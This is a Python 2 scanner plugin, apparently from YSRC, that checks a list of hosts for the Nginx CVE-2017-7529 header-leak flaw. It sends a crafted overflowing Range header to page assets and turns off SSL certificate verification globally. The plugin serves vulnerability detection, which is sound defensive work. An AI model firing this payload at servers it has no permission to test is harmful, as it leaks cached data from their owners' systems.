# coding=utf-8
import urllib2
import re
import urlparse
import HTMLParser
import ssl
import sys

try:
    _create_unverified_https_context = ssl._create_unverified_context  # 忽略证书错误
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

def get_plugin_info():
    plugin_info = {
        "name": "Nginx源header信息泄露漏洞",
        "info": "CVE-2017-7529整数溢出漏洞,可利用获取源站返回头信息。",
        "level": "低危",
        "type": "信息泄露",
        "author": "wolf@YSRC",
        "url": "http://bobao.360.cn/learning/detail/4102.html",
        "keyword": "tag:nginx",
        "source": 1
    }
    return plugin_info


def get_url(domain,port,timeout):
    url_list = []
    if port ==443:
        surl = 'https://' + domain
    else:
        surl = 'http://' + domain
    res = urllib2.urlopen(surl, timeout=timeout)
    html = res.read()
    root_url = res.geturl()
    m = re.findall("<(?:img|link|script)[^>]*?(?:src|href)=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))


def check(ip, port, timeout):
    url_list = get_url(ip + ":" + str(port),port,timeout)
    print url_list
    i = 0
    for url in url_list:
        if i >= 3: break
        i += 1
        headers = urllib2.urlopen(url,timeout=timeout).headers
        file_len = headers["Content-Length"]
        request = urllib2.Request(url)
        request.add_header("Range", "bytes=-%d,-9223372036854%d"%(int(file_len)+623,776000-(int(file_len)+623)))
        print "bytes=-%d,-9223372036854%d" % (int(file_len)+623,776000-(int(file_len)+623))
        cacheres = urllib2.urlopen(request, timeout=timeout)
        #print cacheres.readlines()
        if cacheres.code == 206 and "Content-Range" in cacheres.read(2048):
            print url
            info = u"存在源返回头信息泄露漏洞（CVE-2017-7529）"
            if "X-Proxy-Cache" in cacheres.headers:
                info += u",且开启了缓存功能"
            return info
if __name__ == '__main__':
    #ip="178.63.81.10"
    #port=80
    file = open(sys.argv[1],'r')
    while True:
        line = file.readline().strip('\n')
        if line:
            try:
                print check(line.split(':')[0],line.split(':')[1],5)
            except:
                pass
        else:
            break